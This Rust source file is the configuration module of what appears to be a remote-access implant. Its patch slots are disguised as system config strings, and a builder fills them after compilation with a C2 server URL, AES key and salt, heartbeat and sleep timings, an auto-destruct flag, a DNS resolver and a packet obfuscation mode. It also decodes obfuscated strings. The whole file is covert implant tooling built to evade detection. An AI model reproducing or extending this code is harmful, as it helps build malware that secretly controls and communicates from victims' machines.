// 配置模块
//
// 提供可在二进制文件中修补的配置机制。
// 服务端可以在编译后修改二进制文件中的占位符，注入真实的服务器地址。
use log::{debug, warn};

/// Builder Service 动态注入占位符
/// 
/// 这些常量会在编译时被 Builder Service 替换为实际的值。
/// 构建服务将替换这些字符串。
pub const AES_KEY: &str = "REPLACE_ME_AES_KEY";
pub const REMOTE_STUB: &str = "REPLACE_ME_URL";
pub const ENCRYPTION_SALT: &str = "REPLACE_ME_SALT";
pub const OBFUSCATION_MODE: &str = "REPLACE_ME_OBF";

///服务器 URL 模板 (64 字节)
#[no_mangle]
#[used]
pub static SERVER_URL_TEMPLATE: [u8; 64] = *b"SYSTEM_CONFIG_DATA_SERVICE_PROVIDER_MAPPING_ENDPOINT_SLOT_000001";

/// AES-256 密钥模板 (32 字节)
#[no_mangle]
#[used]
pub static AES_KEY_TEMPLATE: [u8; 32] = *b"SYSTEM_CONFIG_DATA_ENCRYPT_BLOB_";

/// 加密模式
pub const ENCRYPT_MODE: &str = "AES-GCM";

/// 心跳间隔模板 (22 字节)
#[no_mangle]
#[used]
pub static HEARTBEAT_INTERVAL_TEMPLATE: [u8; 22] = *b"HB_DATA_INT_VAL_000010";

/// 自毁模式模板 (18 字节)
#[no_mangle]
#[used]
pub static AUTO_DESTRUCT_TEMPLATE: [u8; 18] = *b"AD_DATA_BOOL_VAL_N";

/// 休眠延时模板 (16 字节)
#[no_mangle]
#[used]
pub static SLEEP_TIME_TEMPLATE: [u8; 16] = *b"ST_DATA_INT_0000";

/// DNS 解析器模板 (64 字节)
#[no_mangle]
#[used]
pub static DNS_RESOLVER_TEMPLATE: [u8; 64] = *b"SYSTEM_NETWORK_STUB_RESOLVER_64_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";

/// 加密盐模板 (32 字节)
#[no_mangle]
#[used]
pub static ENCRYPTION_SALT_TEMPLATE: [u8; 32] = *b"SYSTEM_PROVIDER_CRYPTO_KDF_SALT_";

/// 报文混淆模式模板 (15 字节)
#[no_mangle]
#[used]
pub static PACKET_OBFUSCATION_TEMPLATE: [u8; 15] = *b"OBF_MODE_STRICT";

/// 默认调试服务器地址
pub fn get_default_debug_url() -> String {
    crate::utils::decode_obf(&crate::obf_str!("ws://127.0.0.1:8080/ws"))
}

/// 默认调试 AES 密钥
const DEFAULT_DEBUG_KEY: &[u8; 32] = b"DEBUG_KEY_32_BYTES_FOR_DEV_ONLY!";

/// 默认心跳间隔（秒）
const DEFAULT_HEARTBEAT_INTERVAL: u64 = 10;


/// 获取是否开启自毁
pub fn get_auto_destruct() -> bool {
    String::from_utf8_lossy(&AUTO_DESTRUCT_TEMPLATE).ends_with("_Y")
}

/// 获取休眠延时 (秒)
pub fn get_sleep_time() -> u64 {
    String::from_utf8_lossy(&SLEEP_TIME_TEMPLATE)
        .split('_')
        .last()
        .and_then(|s| s.trim_matches('\0').parse::<u64>().ok())
        .unwrap_or(0)
}


/// 获取服务器 URL (核心修复：移除强制协议检查)
/// 
/// 该函数会检查 `SERVER_URL_TEMPLATE` 数组：
/// - 如果包含 "CONFIG_ID"，说明尚未修补，返回默认调试地址
/// - 否则，解析并返回实际的 URL（去除 null 字节和填充字符）
pub fn get_server_url() -> String {
    // 优先级 1: 检查源码静态修补 (REPLACE_ME_URL)
    // 如果 REMOTE_STUB 不等于原始占位符，说明在编译时已经被 BuilderService 替换了
    if REMOTE_STUB != "REPLACE_ME_URL" && !REMOTE_STUB.is_empty() {
        let url = REMOTE_STUB.to_string();
        debug!("[*] 使用源码硬编码地址: {}", url);
        return url;
    }

    // 优先级 2: 检查二进制动态修补 (SERVER_URL_TEMPLATE)
    let template_str = String::from_utf8_lossy(&SERVER_URL_TEMPLATE);
    if !template_str.contains("SERVICE_PROVIDER_MAPPING") {
        let url = template_str
            .trim_matches('\0')
            .trim_matches(char::from(0))
            .trim_matches('X')
            .trim_matches('_')
            .trim()
            .to_string();
        
        if !url.is_empty() {
            debug!("[*] 使用二进制补丁地址: {}", url);
            return url;
        }
    }
    
    debug!("[*] 未检测到补丁地址，使用本地默认值: {}", get_default_debug_url());
    get_default_debug_url()
}

/// 验证服务器 URL 格式
/// 
/// 仅用于 WebSocket 模式下的再次确认，不用于 get_server_url 的初步筛选。
pub fn validate_server_url(url: &str) -> bool {
    url.starts_with("ws://") || url.starts_with("wss://") || url.starts_with("tcp://") || url.starts_with("dns://")
}

/// 获取 AES 加密密钥
pub fn get_aes_key() -> Vec<u8> {
    let mut base_key = vec![];

    // 1. 检查源码静态修补 (针对源码编译模式)
    if AES_KEY != "REPLACE_ME_AES_KEY" && !AES_KEY.is_empty() {
        let key_str = AES_KEY.trim();
        // 尝试解析 64 位 Hex
        if key_str.len() == 64 {
            if let Ok(decoded) = hex::decode(key_str) {
                base_key = decoded;
            }
        }
        if base_key.is_empty() {
            base_key = key_str.as_bytes().to_vec();
        }
        debug!("[+] Loaded key from source static patch (len: {})", base_key.len());
    }

    // 2. 检查二进制动态修补 (针对 Patch 模式)
    if base_key.is_empty() {
        let placeholder_check = String::from_utf8_lossy(&AES_KEY_TEMPLATE);
        if !placeholder_check.contains("DATA_ENCRYPT") {
            base_key = AES_KEY_TEMPLATE.to_vec();
            debug!("[+] Loaded key from binary dynamic patch (len: {})", base_key.len());
        }
    }

    // 3. 本地调试默认值 (仅限开发)
    if base_key.is_empty() {
        debug!("[*] Using hardcoded debug AES key");
        base_key = DEFAULT_DEBUG_KEY.to_vec();
    }
    
    // 强制修整到 32 字节（AES-256 要求）
    if base_key.len() > 32 {
        base_key.truncate(32);
    } else if base_key.len() < 32 && !base_key.is_empty() {
        base_key.resize(32, 0x00);
    }

    // 应用 Salt (如果有)
    let salt = get_encryption_salt();
    crate::crypto::derive_key(&base_key, &salt)
}
/// 验证 AES 密钥格式
pub fn validate_aes_key(key: &[u8]) -> bool {
    key.len() == 32
}

/// 获取加密配置信息
pub fn get_crypto_config_info() -> CryptoConfigInfo {
    let key = get_aes_key();
    let is_patched = !String::from_utf8_lossy(&AES_KEY_TEMPLATE).contains("DATA_ENCRYPT");
    let is_valid = validate_aes_key(&key);
    
    CryptoConfigInfo {
        encrypt_mode: ENCRYPT_MODE.to_string(),
        key_length: key.len(),
        is_patched,
        is_valid,
    }
}

/// 加密配置信息结构
#[derive(Debug, Clone)]
pub struct CryptoConfigInfo {
    pub encrypt_mode: String,
    pub key_length: usize,
    pub is_patched: bool,
    pub is_valid: bool,
}

/// 获取心跳间隔
pub fn get_heartbeat_interval() -> u64 {
    let interval_str = String::from_utf8_lossy(&HEARTBEAT_INTERVAL_TEMPLATE);
    let interval_part = interval_str
        .split('_')
        .last()
        .unwrap_or("010")
        .trim_matches('\0');
    
    match interval_part.parse::<u64>() {
        Ok(interval) if interval > 0 && interval <= 3600 => {
            debug!("[*] 当前心跳频率: {} 秒", interval);
            interval
        }
        Ok(interval) => {
            warn!("Heartbeat interval {} out of range. Using default.", interval);
            DEFAULT_HEARTBEAT_INTERVAL
        }
        Err(_) => {
            warn!("Failed to parse heartbeat interval. Using default.");
            DEFAULT_HEARTBEAT_INTERVAL
        }
    }
}

/// 获取 DNS 解析器地址
pub fn get_dns_resolver() -> Option<String> {
    let template_str = String::from_utf8_lossy(&DNS_RESOLVER_TEMPLATE);
    if template_str.contains("STUB_RESOLVER") {
        return None;
    }
    
    let resolver = template_str
        .trim_matches('\0')
        .trim_matches(char::from(0))
        .trim_matches('X')
        .trim_matches('_')
        .trim()
        .to_string();
    
    if resolver.is_empty() {
        return None;
    }
    
    if !resolver.contains(':') {
        warn!("Invalid DNS resolver format '{}'. Using default", resolver);
        return None;
    }
    
    debug!("[*] 使用补丁 DNS 服务器: {}", resolver);
    Some(resolver)
}

/// 获取加密盐 (32 字节)
pub fn get_encryption_salt() -> Vec<u8> {
    // 1. 源码静态替换
    if ENCRYPTION_SALT != "REPLACE_ME_SALT" && !ENCRYPTION_SALT.is_empty() {
        let salt_clean = ENCRYPTION_SALT.trim().trim_matches('\0').trim_matches(char::from(0));
        if !salt_clean.is_empty() {
            debug!("[+] Using statically replaced Salt: {}", salt_clean);
            return salt_clean.as_bytes().to_vec();
        }
    }

    // 2. 二进制动态修补
    let template_str = String::from_utf8_lossy(&ENCRYPTION_SALT_TEMPLATE);
    if !template_str.contains("KDF_SALT") {
        debug!("[+] Using dynamically patched Salt (32 bytes)");
        return ENCRYPTION_SALT_TEMPLATE.to_vec();
    }
    Vec::new()
}

pub fn get_packet_obfuscation_mode() -> String {
    // 1. 源码静态替换
    if OBFUSCATION_MODE != "REPLACE_ME_OBF" && !OBFUSCATION_MODE.is_empty() {
        debug!("[+] Using statically replaced Obfuscation: {}", OBFUSCATION_MODE);
        return OBFUSCATION_MODE.to_string();
    }

    // 2. 二进制动态修补
    let template_str = String::from_utf8_lossy(&PACKET_OBFUSCATION_TEMPLATE);
    if !template_str.contains("MODE_STRICT") {
        return template_str
            .trim_matches('\0')
            .trim_matches(char::from(0))
            .trim_matches('X')
            .trim_matches('_')
            .replace("OBF_MODE_", "")
            .to_lowercase();
    }
    "none".to_string()
}

/// 获取配置信息
pub fn get_config_info() -> ConfigInfo {
    let url = get_server_url();
    let is_patched = !String::from_utf8_lossy(&SERVER_URL_TEMPLATE).contains("SERVICE_PROVIDER_MAPPING");
    // 只有在 WS 模式下，validate_server_url 的结果才重要
    let is_valid = if url.starts_with("ws") {
        validate_server_url(&url)
    } else {
        true // DNS 域名默认视为有效
    };
    
    ConfigInfo {
        server_url: url,
        is_patched,
        is_valid,
        template_length: SERVER_URL_TEMPLATE.len(),
        encryption_salt_set: !String::from_utf8_lossy(&ENCRYPTION_SALT_TEMPLATE).contains("KDF_SALT"),
        obfuscation_mode: get_packet_obfuscation_mode(),
    }
}

/// 配置信息结构
#[derive(Debug, Clone, serde::Serialize)]
pub struct ConfigInfo {
    pub server_url: String,
    pub is_patched: bool,
    pub is_valid: bool,
    pub template_length: usize,
    pub encryption_salt_set: bool,
    pub obfuscation_mode: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_template_lengths() {
        assert_eq!(SERVER_URL_TEMPLATE.len(), 64);
        assert_eq!(AES_KEY_TEMPLATE.len(), 32); 
        assert_eq!(DNS_RESOLVER_TEMPLATE.len(), 64);
        assert_eq!(ENCRYPTION_SALT_TEMPLATE.len(), 32);
    }
}
